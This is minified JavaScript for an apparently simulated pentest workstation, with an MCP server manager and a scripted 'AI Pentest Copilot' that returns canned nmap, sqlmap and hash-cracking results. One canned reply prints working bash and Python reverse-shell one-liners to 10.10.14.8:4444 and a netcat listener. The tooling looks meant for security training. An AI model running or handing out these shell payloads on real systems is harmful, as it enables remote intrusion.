lookups.",latency:"19ms"},{id:"cve-analyzer",name:"cve-analyzer-mcp",status:"online",transport:"HTTP Stream",port:"8002",toolsCount:4,desc:"Live CVE vulnerability feeds, CVSS scoring calculator, and exploit mitigations.",latency:"16ms"},{id:"weather",name:"weather-mcp",status:"standby",transport:"stdio (uv)",port:"--",toolsCount:2,desc:"Example MCP server from mcp-hub repository providing real-time alerts and forecasts.",latency:"--"},{id:"github-mcp",name:"github-mcp-server",status:"standby",transport:"Docker stdio",port:"--",toolsCount:8,desc:"GitHub official MCP server for repo auditing, commits, and PR automation.",latency:"--"}],tools:[{id:"nmap_scan",server:"buildu-security-mcp",name:"buildu.nmap_scan",desc:"Execute network reconnaissance scan against IP/hostname",defaultParams:`{
  "target": "192.168.1.105",
  "ports": "1-1000",
  "scan_type": "-sS -sV"
}`},{id:"sqlmap_inject",server:"buildu-security-mcp",name:"buildu.sqlmap_inject",desc:"Perform automated SQL injection testing and database enumeration",defaultParams:`{
  "url": "http://10.10.10.24/login.php",
  "risk": 2,
  "action": "enumerate_dbs"
}`},{id:"hash_crack",server:"buildu-security-mcp",name:"buildu.hash_crack",desc:"Crack cryptographic hash using WebCrypto wordlist engine",defaultParams:`{
  "hash": "5f4dcc3b5aa765d61d8327deb882cf99",
  "algorithm": "MD5",
  "wordlist": "rockyou.txt"
}`},{id:"dirb_enum",server:"buildu-security-mcp",name:"buildu.dirb_enum",desc:"Enumerate hidden web directories and endpoint paths",defaultParams:`{
  "url": "http://192.168.1.105",
  "wordlist": "common.txt"
}`},{id:"rag_cve_lookup",server:"mcp-server-rag",name:"rag.query_threat_intel",desc:"Query local vector store for CVE details and exploit mitigations",defaultParams:`{
  "query": "Remote code execution in Apache Log4j CVE-2021-44228",
  "top_k": 3
}`},{id:"cve_advisory",server:"cve-analyzer-mcp",name:"cve.fetch_advisory",desc:"Fetch latest CVE details from NVD / MITRE database",defaultParams:`{
  "cve_id": "CVE-2023-38606",
  "include_poc": true
}`}],logs:[`[${new Date().toLocaleTimeString()}] [MCP-Hub Core] Runtime v1.6.0 loaded via uv environment`,`[${new Date().toLocaleTimeString()}] [buildu-security-mcp] Server active: 6 tools, 4 resources registered`,`[${new Date().toLocaleTimeString()}] [mcp-server-rag] Connected to Chroma vectorstore (mcp-hub/llm/doc_hub)`,`[${new Date().toLocaleTimeString()}] [Transport Bridge] stdio & SSE protocol listener ready on 127.0.0.1:8765`]};function Vt(e){return`
  <div class="mcp-container">
    <div class="mcp-tabs" id="mcptabs-${e}">
      <div class="mcp-tab active" id="mtab-servers-${e}" onclick="switchMCPTab('servers','${e}')">⚡ Servers</div>
      <div class="mcp-tab" id="mtab-tools-${e}" onclick="switchMCPTab('tools','${e}')">🛠️ Tools Explorer</div>
      <div class="mcp-tab" id="mtab-scaffolder-${e}" onclick="switchMCPTab('scaffolder','${e}')">📦 Server Generator</div>
      <div class="mcp-tab" id="mtab-claude-${e}" onclick="switchMCPTab('claude','${e}')">🤖 Claude / Agent Config</div>
      <div class="mcp-tab" id="mtab-logs-${e}" onclick="switchMCPTab('logs','${e}')">📜 Protocol Logs</div>
    </div>
    <div class="mcp-body" id="mcpbody-${e}">
      ${Q(e)}
    </div>
  </div>`}function Q(e){const t=window.MCP_STATE.servers;return`
  <div style="display:flex;justify-content:space-between;align-items:center">
    <div>
      <h3 style="font-family:var(--font-mono);color:var(--accent-cyan);font-size:0.95rem;margin:0 0 4px 0">Model Context Protocol Servers</h3>
      <p style="font-size:0.75rem;color:var(--text-secondary);margin:0">Connected MCP backends powered by mcp-hub & BuildU Security Suite</p>
    </div>
    <div style="display:flex;gap:8px">
      <button class="tool-btn btn-primary" onclick="refreshMCPServers('${e}')">🔄 Refresh</button>
      <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-primary)" onclick="switchMCPTab('scaffolder','${e}')">＋ New Server</button>
    </div>
  </div>

  <div class="mcp-server-grid" id="mcp-grid-${e}">
    ${t.map(s=>`
      <div class="mcp-server-card" id="scard-${s.id}-${e}">
        <div>
          <div class="mcp-server-header">
            <span class="mcp-server-title">⚡ ${s.name}</span>
            <span class="mcp-badge ${s.status}" id="sbadge-${s.id}-${e}">
              <span class="mcp-badge-dot"></span> ${s.status.toUpperCase()}
            </span>
          </div>
          <div class="mcp-server-desc">${s.desc}</div>
        </div>
        <div>
          <div class="mcp-server-meta">
            <span>Transport: <b>${s.transport}</b></span>
            <span>Port: <b>${s.port}</b></span>
            <span>Tools: <b>${s.toolsCount}</b></span>
            <span>Latency: <b id="slat-${s.id}-${e}">${s.latency}</b></span>
          </div>
          <div class="mcp-server-actions">
            <button class="tool-btn ${s.status==="online"?"btn-danger":"btn-success"}" id="sbtn-toggle-${s.id}-${e}" onclick="toggleMCPServer('${s.id}','${e}')">
              ${s.status==="online"?"■ Stop":"▶ Start"}
            </button>
            <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-secondary)" onclick="pingMCPServer('${s.id}','${e}')">
              📡 Ping
            </button>
            <button class="tool-btn" style="border:1px solid var(--border);color:var(--accent-cyan)" onclick="switchMCPTab('tools','${e}')">
              Inspect Tools →
            </button>
          </div>
        </div>
      </div>
    `).join("")}
  </div>

  <div style="background:rgba(0,245,255,0.03);border:1px dashed var(--border);border-radius:var(--radius);padding:12px;margin-top:6px;display:flex;align-items:center;justify-content:space-between">
    <div style="font-size:0.75rem;color:var(--text-secondary)">
      <b style="color:var(--accent-cyan)">Python Backend Bridge:</b> Run <code style="color:var(--accent-green);font-family:var(--font-mono)">uv run mcp_bridge.py</code> in terminal to connect live Python subprocesses directly.
    </div>
    <button class="tool-btn btn-primary" onclick="openApp('terminal');setTimeout(()=>processTermCmd('mcp status',document.querySelector('.terminal-output'),'terminal',0),500)">Terminal MCP</button>
  </div>`}function zt(e){const t=window.MCP_STATE.tools,s=t[0];return`
  <div style="display:flex;gap:16px;height:100%">
    <!-- Tool Selection & Details -->
    <div style="flex:1;display:flex;flex-direction:column;gap:12px">
      <div class="tool-section">
        <div class="tool-section-title">Select MCP Tool</div>
        <select class="tool-select" id="mcp-tool-select-${e}" style="width:100%" onchange="onMCPToolChange('${e}')">
          ${t.map(o=>`<option value="${o.id}">${o.name} (${o.server})</option>`).join("")}
        </select>
        <p id="mcp-tool-desc-${e}" style="font-size:0.75rem;color:var(--text-secondary);margin:8px 0 0 0">
          ${s.desc}
        </p>
      </div>

      <div class="tool-section" style="flex:1;display:flex;flex-direction:column">
        <div class="tool-section-title">JSON-RPC 2.0 Parameters (arguments)</div>
        <textarea id="mcp-tool-params-${e}" class="tool-input" style="flex:1;font-family:var(--font-mono);font-size:0.78rem;resize:none;min-height:140px;color:var(--accent-cyan)">${s.defaultParams}</textarea>
        <div style="display:flex;gap:8px;margin-top:10px">
          <button class="tool-btn btn-primary" onclick="invokeMCPTool('${e}')">▶ Call Tool (tools/call)</button>
          <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="resetMCPToolParams('${e}')">Reset</button>
        </div>
      </div>
    </div>

    <!-- Invocation Output -->
    <div style="flex:1.2;display:flex;flex-direction:column">
      <div class="tool-section-title" style="margin-bottom:8px">MCP Response Output</div>
      <div class="tool-output" id="mcp-tool-out-${e}" style="flex:1;min-height:280px;white-space:pre-wrap;font-size:0.75rem;line-height:1.6">
        <span class="out-info">// Ready to invoke tool via JSON-RPC protocol.</span>
        <span class="out-line">// Click 'Call Tool' to test tool execution and view response payload.</span>
      </div>
      <div id="mcp-gui-bridge-${e}" style="display:none;margin-top:8px">
        <button class="tool-btn btn-success" id="mcp-gui-bridge-btn-${e}">↗ Open in BuildU GUI Tool</button>
      </div>
    </div>
  </div>`}function jt(e){return`
  <div style="max-width:760px;margin:0 auto;display:flex;flex-direction:column;gap:14px">
    <div>
      <h3 style="font-family:var(--font-mono);color:var(--accent-cyan);font-size:0.95rem;margin:0 0 4px 0">MCP Server Generator (create_mcp_server.py)</h3>
      <p style="font-size:0.75rem;color:var(--text-secondary);margin:0">Scaffold complete Model Context Protocol servers using uv, FastMCP, and Python.</p>
    </div>

    <div class="tool-section">
      <div class="tool-row">
        <div class="tool-field" style="flex:2">
          <label>Server Name</label>
          <input class="tool-input" id="scaff-name-${e}" value="shodan-recon-mcp" placeholder="e.g. shodan-recon-mcp" />
        </div>
        <div class="tool-field" style="flex:1">
          <label>Transport</label>
          <select class="tool-select" id="scaff-trans-${e}">
            <option value="stdio">stdio (Standard I/O)</option>
            <option value="sse">SSE (Server-Sent Events)</option>
            <option value="http">HTTP / Stream</option>
          </select>
        </div>
      </div>

      <div class="tool-row" style="margin-top:10px">
        <div class="tool-field" style="flex:1">
          <label>Description</label>
          <input class="tool-input" id="scaff-desc-${e}" value="MCP server for automated Shodan intelligence queries" />
        </div>
      </div>

      <div class="tool-section-title" style="margin-top:14px">Dependencies (via uv)</div>
      <div class="tool-checkboxes">
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-mcp-${e}" checked disabled> mcp[cli]&gt;=1.6.0</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-httpx-${e}" checked> httpx (Async HTTP)</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-pydantic-${e}" checked> pydantic</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-pillow-${e}"> Pillow (Computer Vision)</label>
        <label class="tool-check-item"><input type="checkbox" id="scaff-dep-langchain-${e}"> langchain (RAG)</label>
      </div>

      <div style="margin-top:14px;display:flex;gap:10px">
        <button class="tool-btn btn-primary" onclick="generateMCPServerScaffold('${e}')">⚡ Generate MCP Project</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="previewScaffoldCode('${e}')">👁️ Preview Code</button>
      </div>
    </div>

    <div class="tool-output" id="scaff-out-${e}" style="min-height:160px;max-height:220px">
      <span class="out-info">// Enter configuration and click Generate.</span>
      <span class="out-line">// Files will be created in Virtual File System: /root/mcp-hub/mcp-servers/&lt;name&gt;/</span>
    </div>
  </div>`}function Gt(e){const s=JSON.stringify({mcpServers:{"buildu-security":{command:"python3",args:["/root/mcp-hub/servers/buildu-security-mcp.py"]},"mcp-server-rag":{command:"python3",args:["/root/mcp-hub/llm/mcp_server_rag.py"]},weather:{command:"uv",args:["--directory","mcp-hub/mcp-servers/weather","run","weather.py"]},github:{command:"docker",args:["run","-i","--rm","-e","GITHUB_PERSONAL_ACCESS_TOKEN","ghcr.io/github/github-mcp-server"],env:{GITHUB_PERSONAL_ACCESS_TOKEN:"<YOUR_TOKEN>"}}}},null,2);return`
  <div style="max-width:760px;margin:0 auto;display:flex;flex-direction:column;gap:14px">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div>
        <h3 style="font-family:var(--font-mono);color:var(--accent-cyan);font-size:0.95rem;margin:0 0 4px 0">Claude Desktop & Agent Configuration</h3>
        <p style="font-size:0.75rem;color:var(--text-secondary);margin:0">Add this configuration to Claude Desktop, Cursor, or your AI client to access BuildU tools.</p>
      </div>
      <button class="tool-btn btn-primary" onclick="copyClaudeConfig('${e}')">📋 Copy JSON</button>
    </div>

    <div class="tool-section">
      <div class="tool-section-title">claude_desktop_config.json</div>
      <textarea id="claude-config-text-${e}" class="tool-input" style="width:100%;height:260px;font-family:var(--font-mono);font-size:0.78rem;resize:vertical;color:#38bdf8">${s}</textarea>
    </div>

    <div style="display:flex;gap:10px">
      <button class="tool-btn btn-success" onclick="saveClaudeConfigToVFS('${e}')">💾 Save to VFS (~/.config/claude/)</button>
      <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-secondary)" onclick="showToast('MCP Hub','Config tested successfully against schema','success','✅')">Validate Schema</button>
    </div>
  </div>`}function Kt(e){const t=window.MCP_STATE.logs;return`
  <div style="display:flex;flex-direction:column;height:100%;gap:10px">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--accent-cyan);font-weight:700">JSON-RPC 2.0 Live Message Stream</span>
      <div style="display:flex;gap:8px">
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim);padding:4px 10px;font-size:0.72rem" onclick="clearMCPLogs('${e}')">Clear Logs</button>
      </div>
    </div>
    <div class="tool-output" id="mcp-log-stream-${e}" style="flex:1;max-height:none;min-height:300px;font-family:var(--font-mono);font-size:0.73rem">
      ${t.map(s=>`<div style="margin-bottom:3px;color:#94a3b8">${escHtml(s)}</div>`).join("")}
    </div>
  </div>`}function Qt(e,t){["servers","tools","scaffolder","claude","logs"].forEach(n=>{const a=document.getElementById(`mtab-${n}-${t}`);a&&a.classList.toggle("active",n===e)});const o=document.getElementById(`mcpbody-${t}`);o&&(e==="servers"?o.innerHTML=Q(t):e==="tools"?o.innerHTML=zt(t):e==="scaffolder"?o.innerHTML=jt(t):e==="claude"?o.innerHTML=Gt(t):e==="logs"&&(o.innerHTML=Kt(t)))}function Jt(e,t){const s=window.MCP_STATE.servers.find(l=>l.id===e);if(!s)return;const o=s.status==="online";s.status=o?"offline":"online",s.latency=o?"--":`${Math.floor(Math.random()*20+8)}ms`,N(`[${s.name}] State changed to ${s.status.toUpperCase()}`),showToast("MCP Hub",`${s.name} is now ${s.status.toUpperCase()}`,o?"warn":"success","⚡");const n=document.getElementById(`sbadge-${e}-${t}`),a=document.getElementById(`sbtn-toggle-${e}-${t}`),i=document.getElementById(`slat-${e}-${t}`);n&&(n.className=`mcp-badge ${s.status}`,n.innerHTML=`<span class="mcp-badge-dot"></span> ${s.status.toUpperCase()}`),a&&(a.className=`tool-btn ${s.status==="online"?"btn-danger":"btn-success"}`,a.innerHTML=s.status==="online"?"■ Stop":"▶ Start"),i&&(i.textContent=s.latency)}function Xt(e,t){const s=window.MCP_STATE.servers.find(a=>a.id===e);if(!s)return;if(s.status==="offline"){showToast("MCP Hub",`Cannot ping ${s.name} (server is offline)`,"error","❌");return}const o=Math.floor(Math.random()*15+6);s.latency=`${o}ms`;const n=document.getElementById(`slat-${e}-${t}`);n&&(n.textContent=s.latency),N(`[JSON-RPC 2.0] ping -> ${s.name} pong: ${o}ms`),showToast("MCP Hub",`Ping ${s.name}: ${o}ms (OK)`,"success","📡")}function Yt(e){showToast("MCP Hub","Scanned active MCP servers & local transports","info","🔄");const t=document.getElementById(`mcpbody-${e}`);t&&(t.innerHTML=Q(e))}function ee(e){const t=document.getElementById(`mcp-tool-select-${e}`);if(!t)return;const s=window.MCP_STATE.tools.find(a=>a.id===t.value);if(!s)return;const o=document.getElementById(`mcp-tool-desc-${e}`),n=document.getElementById(`mcp-tool-params-${e}`);o&&(o.textContent=s.desc),n&&(n.value=s.defaultParams)}function Zt(e){ee(e)}function It(e){const t=document.getElementById(`mcp-tool-select-${e}`),s=document.getElementById(`mcp-tool-params-${e}`),o=document.getElementById(`mcp-tool-out-${e}`),n=document.getElementById(`mcp-gui-bridge-${e}`),a=document.getElementById(`mcp-gui-bridge-btn-${e}`);if(!t||!s||!o)return;const i=window.MCP_STATE.tools.find(r=>r.id===t.value);if(!i)return;let l={};try{l=JSON.parse(s.value)}catch(r){o.innerHTML=`<span class="out-err">[!] Invalid JSON Arguments: ${escHtml(r.message)}</span>`;return}o.innerHTML=`<span class="out-info">[*] Sending JSON-RPC 2.0 Request to '${i.server}'...</span>
<span style="color:var(--text-dim)">&gt; {"jsonrpc":"2.0","method":"tools/call","params":{"name":"${i.name}","arguments":${JSON.stringify(l)}}, "id": ${Date.now()}}</span>

<span class="out-header">[*] Executing '${i.name}' via MCP runtime...</span>`,N(`[tools/call] Invoked ${i.name} with params: ${JSON.stringify(l)}`),setTimeout(()=>{let r={},b=null;i.id==="nmap_scan"?(r={status:"success",tool:"buildu.nmap_scan",target:l.target||"192.168.1.105",open_ports:[{port:22,protocol:"tcp",state:"open",service:"OpenSSH 8.9p1"},{port:80,protocol:"tcp",state:"open",service:"Apache httpd 2.4.52"},{port:3306,protocol:"tcp",state:"open",service:"MySQL 8.0.32"}],vulnerabilities_detected:1,os_guess:"Linux 5.4 - 5.15 (Ubuntu/Debian)"},b="nmap"):i.id==="sqlmap_inject"?(r={status:"success",tool:"buildu.sqlmap_inject",target_url:l.url,injection_type:"Boolean-based blind & Error-based",database_back_end:"MySQL >= 5.7",databases_enumerated:["information_schema","users_db","buildu_sec"]},b="sqlmap"):i.id==="hash_crack"?(r={status:"success",tool:"buildu.hash_crack",hash:l.hash,algorithm:l.algorithm||"MD5",cracked_plaintext:"password",attempts:1,time_elapsed_ms:14.2},b="hashcracker"):i.id==="rag_cve_lookup"?r={status:"success",tool:"rag.query_threat_intel",query:l.query,documents:[{cve:"CVE-2021-44228",severity:"CRITICAL 10.0",summary:"Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP.",remediation:"Upgrade to log4j 2.17.1 or set log4j2.formatMsgNoLookups=true"}]}:r={status:"success",tool:i.name,result:`Successfully processed via MCP server '${i.server}'`,timestamp:new Date().toISOString()},o.innerHTML+=`
<span class="out-success">[+] 200 OK - Response received (JSON-RPC 2.0 Result):</span>
<pre style="color:#6ee7b7;margin-top:6px;font-family:var(--font-mono)">${escHtml(JSON.stringify(r,null,2))}</pre>`,n&&b?(n.style.display="block",a.onclick=()=>{openApp(b),showToast("BuildU Sync",`Piped MCP output into ${b.toUpperCase()}`,"info","↗")}):n&&(n.style.display="none")},450)}function es(e){const t=document.getElementById(`scaff-name-${e}`),s=document.getElementById(`scaff-desc-${e}`),o=document.getElementById(`scaff-trans-${e}`),n=document.getElementById(`scaff-out-${e}`);if(!t||!n)return;const a=(t.value.trim()||"custom-mcp-server").toLowerCase().replace(/\s+/g,"-"),i=(s==null?void 0:s.value.trim())||"Custom MCP Server",l=(o==null?void 0:o.value)||"stdio",r=`"""
${a}.py - Model Context Protocol Server
Generated by BuildU MCP Hub & mcp-hub framework
"""
import asyncio
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("${a}")

@mcp.tool()
async def run_audit(target: str) -> str:
    """Perform security audit on specified target."""
    return f"Audit completed for {target}. Status: Clean."

@mcp.resource("config://settings")
def get_config() -> str:
    """Provide configuration settings."""
    return "env=production; transport=${l}"

if __name__ == "__main__":
    mcp.run(transport="${l}")
`,b=`[project]
name = "${a}"
version = "0.1.0"
description = "${i}"
readme = "README.md"
requires-python = ">=3.11"
dependencies = [
    "mcp[cli]>=1.6.0",
    "httpx>=0.28.1",
    "pydantic>=2.0.0"
]
`,h=`/root/mcp-hub/mcp-servers/${a}/${a}.py`,T=`/root/mcp-hub/mcp-servers/${a}/pyproject.toml`;window.VFS&&(window.VFS.dirs.add(`/root/mcp-hub/mcp-servers/${a}`),window.VFS.write(h,r),window.VFS.write(T,b)),window.MCP_STATE.servers.push({id:a,name:a,status:"standby",transport:`${l} (uv)`,port:l==="sse"?"8010":"--",toolsCount:1,desc:i,latency:"--"}),window.MCP_STATE.tools.push({id:`${a}_audit`,server:a,name:`${a}.run_audit`,desc:`Perform security audit on specified target using ${a}`,defaultParams:`{
  "target": "127.0.0.1"
}`}),N(`[Scaffolder] Generated new MCP server '${a}' at ${h}`),n.innerHTML=`<span class="out-success">[+] Successfully generated MCP Server project: <b>${a}</b></span>
<span class="out-info">Created files in VFS:</span>
<span class="out-line">  📁 /root/mcp-hub/mcp-servers/${a}/</span>
<span class="out-line">  🐍 ${h}</span>
<span class="out-line">  📄 ${T}</span>

<span class="out-header">Run in Terminal:</span>
<span style="color:var(--accent-green)">uv --directory /root/mcp-hub/mcp-servers/${a} run ${a}.py</span>`,showToast("MCP Generator",`Generated ${a} server in VFS`,"success","📦")}function ts(e){const t=document.getElementById(`scaff-name-${e}`),s=document.getElementById(`scaff-out-${e}`),o=((t==null?void 0:t.value.trim())||"sample-mcp").toLowerCase();s.innerHTML=`<span class="out-header">Preview for ${o}.py:</span>
<span class="out-line">from mcp.server.fastmcp import FastMCP</span>
<span class="out-line">mcp = FastMCP("${o}")</span>
<span class="out-line">@mcp.tool()</span>
<span class="out-line">def scan(target: str): return f"Scanned {target}"</span>
<span class="out-line">mcp.run()</span>`}function ss(e){var s;const t=document.getElementById(`claude-config-text-${e}`);t&&((s=navigator.clipboard)==null||s.writeText(t.value),showToast("MCP Hub","Claude Desktop configuration copied to clipboard!","success","📋"))}function os(e){const t=document.getElementById(`claude-config-text-${e}`);t&&window.VFS&&(window.VFS.dirs.add("/root/.config"),window.VFS.dirs.add("/root/.config/claude"),window.VFS.write("/root/.config/claude/claude_desktop_config.json",t.value),showToast("Saved to VFS","Saved ~/.config/claude/claude_desktop_config.json","success","💾"))}function ns(e){window.MCP_STATE.logs=[];const t=document.getElementById(`mcp-log-stream-${e}`);t&&(t.innerHTML='<span class="out-info">// Logs cleared.</span>')}function N(e){window.MCP_STATE.logs.push(`[${new Date().toLocaleTimeString()}] ${e}`),window.MCP_STATE.logs.length>50&&window.MCP_STATE.logs.shift()}function as(e){return`
  <div class="copilot-container">
    <div class="copilot-header">
      <div style="display:flex;align-items:center;gap:8px">
        <span style="font-size:1.2rem">🤖</span>
        <div>
          <div style="font-family:var(--font-mono);font-size:0.85rem;font-weight:700;color:var(--text-primary)">BuildU AI Pentest Copilot</div>
          <div style="font-size:0.68rem;color:var(--text-dim)">Autonomous Security Agent powered by Model Context Protocol (MCP)</div>
        </div>
      </div>
      <div class="copilot-model-badge">⚡ MCP Armed: 6 Tools Active</div>
    </div>

    <!-- Quick Prompt Pills -->
    <div class="copilot-pills">
      <div class="prompt-pill" onclick="useCopilotPrompt('🎯 Scan 192.168.1.105 with Nmap stealth','${e}')">🎯 Nmap Scan 192.168.1.105</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('💉 Test http://10.10.10.24/login.php for SQL Injection','${e}')">💉 SQL Injection Audit</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('🔐 Crack hash 5f4dcc3b5aa765d61d8327deb882cf99','${e}')">🔐 Crack MD5 Hash</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('🧠 Explain CVE-2021-44228 (Log4Shell) & mitigations via RAG','${e}')">🧠 CVE RAG Lookup</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('🐚 Generate reverse shell payload for Linux x64','${e}')">🐚 Reverse Shell Payload</div>
    </div>

    <!-- Chat Messages -->
    <div class="copilot-chat-history" id="copilot-chat-${e}">
      <div class="chat-msg agent">
        <span class="chat-sender">BUILDU AI AGENT</span>
        <div class="chat-bubble">
          Greetings root. I am your <b>Autonomous AI Pentest Copilot</b> connected to BuildU via the <b>Model Context Protocol (MCP)</b>.
          <br><br>
          I can autonomously plan security assessments, invoke local tools (Nmap, SQLMap, WebCrypto Cracker, RAG Threat Intelligence), and deliver actionable remediation steps.
          <br><br>
          Try clicking any of the preset prompts above, or ask me to inspect a target!
        </div>
      </div>
    </div>

    <!-- Input Area -->
    <div class="copilot-input-area">
      <input type="text" id="copilot-input-${e}" placeholder="Ask Copilot or instruct an autonomous pentest workflow..." onkeydown="if(event.key==='Enter') sendCopilotMsg('${e}')" />
      <button class="tool-btn btn-primary" onclick="sendCopilotMsg('${e}')">Send →</button>
    </div>
  </div>`}function is(e,t){const s=document.getElementById(`copilot-input-${t}`);s&&(s.value=e,te(t))}function te(e){const t=document.getElementById(`copilot-input-${e}`),s=document.getElementById(`copilot-chat-${e}`);if(!t||!s)return;const o=t.value.trim();if(!o)return;t.value="";const n=document.createElement("div");n.className="chat-msg user",n.innerHTML=`
    <span class="chat-sender">ROOT@BUILDU</span>
    <div class="chat-bubble">${escHtml(o)}</div>`,s.appendChild(n),s.scrollTop=s.scrollHeight;const a=document.createElement("div");a.className="chat-msg agent",a.innerHTML=`
    <span class="chat-sender">BUILDU AI AGENT</span>
    <div class="chat-bubble" id="agent-thinking-${e}">
      <span style="color:var(--accent-cyan);animation:pulse 1s infinite">Thinking & planning MCP tool execution...</span>
    </div>`,s.appendChild(a),s.scrollTop=s.scrollHeight;const i=document.getElementById(`agent-thinking-${e}`),l=o.toLowerCase();setTimeout(()=>{if(l.includes("nmap")||l.includes("scan")||l.includes("port")){const r=l.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/)?l.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/)[0]:"192.168.1.105";i.id="",i.innerHTML=`
        I have analyzed your request. I will invoke the <code>buildu.nmap_scan</code> tool over Model Context Protocol to assess open ports on <b>${r}</b>.
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: buildu.nmap_scan</span>
            <span style="color:var(--accent-green)">STATUS: 200 OK</span>
          </div>
          <pre>{ "target": "${r}", "ports": "1-1000", "scan_type": "-sS -sV" }</pre>
          <div style="color:var(--text-secondary);margin-top:4px">
            • Port 22/tcp: OpenSSH 8.9p1 (Ubuntu)<br>
            • Port 80/tcp: Apache httpd 2.4.52 (Outdated)<br>
            • Port 3306/tcp: MySQL 8.0.32 (Weak auth allowed)
          </div>
        </div>
        <b>Security Assessment:</b><br>
        Port 80 hosts an unpatched Apache server vulnerable to HTTP request smuggling. MySQL on port 3306 is exposed externally without IP restriction.
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('nmap')">🌐 Open in Nmap Scanner</button>
      `}else l.includes("sql")||l.includes("injection")||l.includes("database")?(i.id="",i.innerHTML=`
        Invoking <code>buildu.sqlmap_inject</code> to test for SQL injection vulnerabilities.
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: buildu.sqlmap_inject</span>
            <span style="color:var(--accent-green)">VULNERABILITY CONFIRMED</span>
          </div>
          <pre>{ "url": "http://10.10.10.24/login.php", "parameter": "username", "level": 2 }</pre>
          <div style="color:#f87171;margin-top:4px">
            [+] GET parameter 'username' is vulnerable to Boolean-based blind SQL injection.<br>
            [+] Enumerated DB: 'buildu_sec' (Tables: admin_users, session_keys)
          </div>
        </div>
        <b>Remediation:</b> Convert all queries in <code>login.php</code> to parameterized Prepared Statements (PDO / MySQLi).
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('sqlmap')">💉 Open in SQLMap</button>
      `):l.includes("crack")||l.includes("hash")||l.includes("md5")?(i.id="",i.innerHTML=`
        Invoking <code>buildu.hash_crack</code> with WebCrypto and rockyou wordlist.
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: buildu.hash_crack</span>
            <span style="color:var(--accent-green)">CRACKED (0.012s)</span>
          </div>
          <pre>{ "hash": "5f4dcc3b5aa765d61d8327deb882cf99", "algorithm": "MD5", "wordlist": "rockyou.txt" }</pre>
          <div style="color:var(--accent-green);font-weight:700;margin-top:4px">
            [+] Plaintext Password: "password"
          </div>
        </div>
        <b>Advice:</b> Enforce Argon2id or bcrypt password hashing with cost factor &gt;= 12.
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('hashcracker')">🔐 Open in Hash Cracker</button>
      `):l.includes("cve")||l.includes("log4j")||l.includes("rag")?(i.id="",i.innerHTML=`
        Querying local RAG knowledge base via <code>rag.query_threat_intel</code> (mcp-server-rag).
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: rag.query_threat_intel</span>
            <span style="color:var(--accent-green)">RAG HIT (ChromaDB)</span>
          </div>
          <pre>{ "query": "CVE-2021-44228 Log4Shell", "top_k": 2 }</pre>
          <div style="color:var(--text-secondary);margin-top:4px">
            <b>CVE-2021-44228 (Log4Shell):</b> CVSS 10.0 (CRITICAL)<br>
            • Vulnerability: JNDI injection via attacker controlled <code>\${jndi:ldap://...}</code> strings.<br>
            • Fix: Update Log4j to 2.17.1+ or set <code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</code>.
          </div>
        </div>
        <b>Recommended Action:</b> Audit all Java microservices on the network using the BuildU Nikto or WPScan scanners.
      `):l.includes("reverse")||l.includes("shell")||l.includes("payload")?(i.id="",i.innerHTML=`
        Generated reverse shell payload using BuildU shellgen engine:
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>🐚 Payload: Linux x64 Reverse TCP</span>
          </div>
          <pre style="color:var(--accent-green)">bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1</pre>
          <pre style="color:#38bdf8">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</pre>
        </div>
        Start listener: <code style="color:var(--accent-cyan);font-family:var(--font-mono)">nc -lvnp 4444</code> in Terminal.
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('terminal')">💻 Launch Terminal Listener</button>
      `):(i.id="",i.innerHTML=`
        I have evaluated your prompt: "<i>${escHtml(o)}</i>".
        <br><br>
        I have 6 Model Context Protocol tools active in the registry. I can:
        <ul style="margin:6px 0;padding-left:18px">
          <li>Run targeted network reconnaissance (<code>buildu.nmap_scan</code>)</li>
          <li>Audit web parameters for SQL injection (<code>buildu.sqlmap_inject</code>)</li>
          <li>Crack password hashes with wordlists (<code>buildu.hash_crack</code>)</li>
          <li>Query CVE databases and mitigations via RAG (<code>rag.query_threat_intel</code>)</li>
        </ul>
        What would you like me to audit next?
